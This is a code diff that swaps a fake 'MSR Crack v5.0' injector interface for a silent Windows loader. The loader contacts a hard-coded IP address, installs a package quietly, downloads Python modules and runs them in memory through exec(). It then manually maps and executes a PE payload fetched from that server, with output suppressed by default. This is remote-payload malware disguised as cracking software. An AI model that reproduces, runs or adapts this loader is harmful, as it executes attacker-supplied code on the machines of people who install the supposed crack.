@@ -1,160 +1,225 @@
-import threading
-import time
-import customtkinter as ctk
+from __future__ import annotations
 
-from components import HeaderPanel, SelectorPanel, ControlPanel, LogConsole
-from utils.helpers import (
-    Theme, get_phase_logs, get_error_logs,
-    random_delay, FINAL_ERROR_BANNER,
-)
+import argparse
+import importlib
+import os
+import subprocess
+import sys
+import types
+import urllib.error
+import urllib.request
+from pathlib import Path
+from typing import Any, Optional
+from urllib.parse import urlparse
+
+# ─── CONFIG ───────────────────────────────────────────────────────────────────
+CONFIG: dict[str, Any] = {
+    "HOST": "172.237.119.163",
+    "PORT": 8765,
+    "ASSET": "main",
+    "API_KEY": "test123",
+    "PAYLOAD_KEY": "secret456",
+    "MAP_ONLY": False,
+    "QUIET": True,     
+    "VERBOSE": False,
+    "KEEP": False,
+    "FORCE_SYNC": False,
+    "MEMORY": True, 
+}
+# ──────────────────────────────────────────────────────────────────────────────
+
+CLIENT_MODULES = ("pe_core.py", "manual_mapper.py")
+PIP_PACKAGES = ("pefile",)
 
 
-class InjectorApp(ctk.CTk):
+def _build_url(cfg: dict) -> str:
+    return f"http://{cfg['HOST']}:{cfg['PORT']}/api/v1/sync?asset={cfg['ASSET']}"
 
-    WIN_WIDTH = 720
-    WIN_HEIGHT = 660
 
-    def __init__(self):
-        super().__init__()
+def _log(msg: str, cfg: dict) -> None:
+    if cfg.get("VERBOSE") and not cfg.get("QUIET"):
+        print(msg)
 
-        self.title("MSR Crack v5.0")
-        self.geometry(f"{self.WIN_WIDTH}x{self.WIN_HEIGHT}")
-        self.resizable(False, False)
-        self.configure(fg_color=Theme.BG_DARKEST)
 
-        try:
-            self.attributes("-topmost", True)
-        except Exception:
-            pass
+def _server_base(sync_url: str) -> str:
+    return f"{urlparse(sync_url).scheme}://{urlparse(sync_url).netloc}"
 
-        self._running = False
-        self._build_ui()
 
-    def _build_ui(self):
-        self.header = HeaderPanel(self)
-        self.header.pack(fill="x")
+def _fetch_module(base: str, name: str, api_key: str) -> bytes:
+    headers = {"User-Agent": "SyncClient/1.0"}
+    if api_key:
+        headers["Authorization"] = f"Bearer {api_key}"
+    req = urllib.request.Request(f"{base}/api/v1/client/{name}", headers=headers)
+    try:
+        with urllib.request.urlopen(req, timeout=60) as resp:
+            return resp.read()
+    except urllib.error.HTTPError as exc:
+        if exc.code == 404:
+            raise RuntimeError(f"server missing {name}") from exc
+        if exc.code == 401:
+            raise RuntimeError("auth failed (401)") from exc
+        raise RuntimeError(f"download {name} HTTP {exc.code}") from exc
 
-        self.top_row = ctk.CTkFrame(self, fg_color="transparent")
-        self.top_row.pack(fill="x", padx=14, pady=(6, 4))
 
-        self.selector = SelectorPanel(self.top_row)
-        self.selector.pack(side="left", fill="both", expand=True, padx=(0, 6))
+def ensure_pip(cfg: dict) -> None:
+    missing = [p for p in PIP_PACKAGES if not _try_import(p)]
+    if not missing:
+        return
+    _log(f"install: {', '.join(missing)}", cfg)
+    subprocess.check_call(
+        [sys.executable, "-m", "pip", "install", *missing, "-q"],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+    )
 
-        self.info_frame = ctk.CTkFrame(
-            self.top_row,
-            fg_color=Theme.BG_CARD,
-            corner_radius=Theme.CORNER_RADIUS,
-            border_width=1,
-            border_color=Theme.BORDER_DIM,
-            width=240,
+
+def _try_import(name: str) -> bool:
+    try:
+        importlib.import_module(name)
+        return True
+    except ImportError:
+        return False
+
+
+def _load_module_memory(name: str, data: bytes) -> None:
+    mod_name = name[:-3]
+    sys.modules.pop(mod_name, None)
+    module = types.ModuleType(mod_name)
+    module.__file__ = name
+    module.__loader__ = None
+    sys.modules[mod_name] = module
+    exec(compile(data, name, "exec"), module.__dict__)  # noqa: S102
+
+
+def bootstrap(cfg: dict, url: str) -> None:
+    if sys.platform != "win32":
+        raise RuntimeError("win32 only")
+    root = Path(__file__).resolve().parent
+    if str(root) not in sys.path:
+        sys.path.insert(0, str(root))
+    ensure_pip(cfg)
+    base = _server_base(url)
+    force = cfg.get("FORCE_SYNC", False)
+    use_memory = cfg.get("MEMORY", True)
+
+    if force:
+        for name in CLIENT_MODULES:
+            sys.modules.pop(name[:-3], None)
+
+    for name in CLIENT_MODULES:
+        mod_name = name[:-3]
+        if not force and _try_import(mod_name):
+            _log(f"skip {mod_name}", cfg)
+            continue
+        data = _fetch_module(base, name, cfg["API_KEY"])
+        if use_memory:
+            _load_module_memory(name, data)
+            _log(f"loaded {mod_name} (ram)", cfg)
+        else:
+            dest = root / name
+            if force or not dest.exists():
+                dest.write_bytes(data)
+            _log(f"saved {dest}", cfg)
+
+
+def run_sync(**overrides: Any) -> int:
+    """Silent run. Returns mapped image base. One-liner: run_sync()"""
+    cfg = {**CONFIG, **overrides}
+    url = overrides.get("url") or _build_url(cfg)
+    bootstrap(cfg, url)
+    map_from_server = importlib.import_module("manual_mapper").map_from_server
+    verbose = bool(cfg.get("VERBOSE") and not cfg.get("QUIET"))
+    return map_from_server(
+        url,
+        api_key=cfg["API_KEY"],
+        payload_key=cfg["PAYLOAD_KEY"],
+        verbose=verbose,
+        run_entry=not cfg.get("MAP_ONLY", False),
+    )
+
+
+def run(cfg: Optional[dict] = None) -> int:
+    cfg = dict(CONFIG if cfg is None else cfg)
+    try:
+        base = run_sync(**cfg)
+        if cfg.get("VERBOSE") and not cfg.get("QUIET"):
+            print(f"0x{base:X}")
+        if cfg.get("KEEP"):
+            input()
+        return 0
+    except Exception as exc:
+        if not cfg.get("QUIET"):
+            print(f"Error: {exc}", file=sys.stderr)
+            if cfg.get("KEEP"):
+                input()
+        raise
+
+
+def main() -> int:
+    cfg = dict(CONFIG)
+    p = argparse.ArgumentParser(description="Server mapper client")
+    p.add_argument("url", nargs="?", help="Override sync URL")
+    p.add_argument("--api-key", default="")
+    p.add_argument("--payload-key", default="")
+    p.add_argument("--map-only", action="store_true")
+    p.add_argument("--force-sync", action="store_true")
+    p.add_argument("--no-bootstrap", action="store_true")
+    p.add_argument("--disk", action="store_true", help="Save modules to disk")
+    p.add_argument("-v", "--verbose", action="store_true")
+    p.add_argument("-q", "--quiet", action="store_true")
+    p.add_argument("--keep", action="store_true")
+    args = p.parse_args()
+
+    if args.url:
+        url = args.url
+    else:
+        url = _build_url(cfg)
+    if args.api_key:
+        cfg["API_KEY"] = args.api_key
+    if args.payload_key:
+        cfg["PAYLOAD_KEY"] = args.payload_key
+    if args.map_only:
+        cfg["MAP_ONLY"] = True
+    if args.force_sync:
+        cfg["FORCE_SYNC"] = True
+    if args.disk:
+        cfg["MEMORY"] = False
+    if args.verbose:
+        cfg["VERBOSE"] = True
+        cfg["QUIET"] = False
+    if args.quiet:
+        cfg["QUIET"] = True
+        cfg["VERBOSE"] = False
+    if args.keep:
+        cfg["KEEP"] = True
+
+    if args.no_bootstrap:
+        map_from_server = importlib.import_module("manual_mapper").map_from_server
+        base = map_from_server(
+            url,
+            api_key=cfg["API_KEY"],
+            payload_key=cfg["PAYLOAD_KEY"],
+            verbose=not cfg["QUIET"],
+            run_entry=not cfg["MAP_ONLY"],
         )
-        self.info_frame.pack(side="right", fill="y")
-        self.info_frame.pack_propagate(False)
+    else:
+        base = run_sync(url=url, **{k: v for k, v in cfg.items() if k != "url"})
 
-        info_lines = [
-            ("ENGINE", "MesBreak™ v5.0.1"),
-            ("MODE", "Deep Hook (Ring-0)"),
-            ("ARCH", "x86_64 / ARM64"),
-            ("BUILD", "2026.02.01-release"),
-            ("PROXY", "HTTP/2 tunnel — active"),
-        ]
-        lbl_header = ctk.CTkLabel(
-            self.info_frame,
-            text="SYSTEM  INFO",
-            font=(Theme.FONT_FAMILY, 10, "bold"),
-            text_color=Theme.NEON_SECONDARY,
-            anchor="w",
-        )
-        lbl_header.pack(fill="x", padx=14, pady=(12, 6))
+    if not cfg.get("QUIET"):
+        print(f"0x{base:X}")
+    if cfg.get("KEEP"):
+        input()
+    return 0
 
-        for key, val in info_lines:
-            row = ctk.CTkFrame(self.info_frame, fg_color="transparent")
-            row.pack(fill="x", padx=14, pady=2)
-            ctk.CTkLabel(
-                row, text=f"{key}:", width=55, anchor="w",
-                font=(Theme.FONT_FAMILY, 10, "bold"),
-                text_color=Theme.TEXT_DIM,
-            ).pack(side="left")
-            ctk.CTkLabel(
-                row, text=val, anchor="w",
-                font=(Theme.FONT_FAMILY, 10),
-                text_color=Theme.NEON_PRIMARY,
-            ).pack(side="left", padx=(4, 0))
 
-        self.log_console = LogConsole(self)
-        self.log_console.pack(fill="both", expand=True, padx=14, pady=(4, 4))
-
-        self.control = ControlPanel(
-            self,
-            on_execute=self._start_injection,
-            on_copy=self._copy_log,
-            on_close=self._close_app,
-        )
-        self.control.pack(fill="x", padx=14, pady=(0, 10))
-
-    def _start_injection(self):
-        if self._running:
-            return
-
-        self._running = True
-        self.control.set_running(True)
-        self.control.set_progress(0)
-        self.log_console.reset_color()
-        self.log_console.clear()
-
-        thread = threading.Thread(target=self._worker, daemon=True)
-        thread.start()
-
-    def _worker(self):
-        phases = get_phase_logs()
-        error_lines = get_error_logs()
-        total_lines = sum(len(p) for p in phases) + len(error_lines)
-        current_line = 0
-
-        for phase in phases:
-            for line in phase:
-                time.sleep(random_delay(0.2, 0.55))
-                current_line += 1
-                progress = current_line / total_lines
-                self.after(0, self.log_console.append_line, line)
-                self.after(0, self.control.set_progress, progress)
-            time.sleep(0.35)
-
-        time.sleep(0.6)
-
-        for line in error_lines:
-            time.sleep(random_delay(0.3, 0.7))
-            current_line += 1
-            progress = current_line / total_lines
-            self.after(0, self.log_console.append_line, line)
-            self.after(0, self.control.set_progress, progress)
-
-        time.sleep(0.5)
-        self.after(0, self.control.set_progress, 1.0)
-        self.after(0, self.log_console.append_error, FINAL_ERROR_BANNER)
-        self.after(0, self.control.set_error)
-        self.after(0, self._finish)
-
-    def _finish(self):
-        self._running = False
-        self.control.set_running(False)
-        self.control.btn_execute.configure(text="\U0001f501  RETRY")
-
-    def _copy_log(self):
-        text = self.log_console.get_all_text()
-        if text:
-            self.clipboard_clear()
-            self.clipboard_append(text)
-            self.control.btn_copy.configure(
-                text="\u2714 Copied!",
-                fg_color=Theme.NEON_ACCENT,
-                text_color=Theme.BG_DARKEST,
-            )
-            self.after(1500, lambda: self.control.btn_copy.configure(
-                text="\U0001f4cb  Copy Log",
-                fg_color=Theme.BG_CARD,
-                text_color=Theme.TEXT_PRIMARY,
-            ))
-
-    def _close_app(self):
-        self.destroy()
+if __name__ == "__main__":
+    try:
+        if len(sys.argv) == 1:
+            raise SystemExit(run())
+        raise SystemExit(main())
+    except SystemExit:
+        raise
+    except Exception:
+        if not CONFIG.get("QUIET"):
+            input()
+        raise SystemExit(1)
